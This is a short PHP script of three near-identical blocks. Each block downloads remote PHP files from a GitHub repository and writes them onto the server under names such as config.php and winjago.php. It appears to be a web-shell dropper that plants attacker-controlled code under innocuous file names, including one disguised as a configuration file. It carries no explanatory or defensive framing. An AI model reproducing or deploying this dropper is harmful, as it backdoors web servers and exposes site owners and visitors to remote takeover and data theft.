<?php
$make = fopen('config.php', 'w+');
$get = file_get_contents('https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/Alies.php');
fwrite($make, $get);
fclose($make);
?>
<?php
$make = fopen('winjago.php', 'w+');
$get = file_get_contents('https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/0x1.php');
fwrite($make, $get);
fclose($make);
?>
<?php
$make = fopen('config.php', 'w+');
$get = file_get_contents('https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/0x1.php');
fwrite($make, $get);
fclose($make);
?>
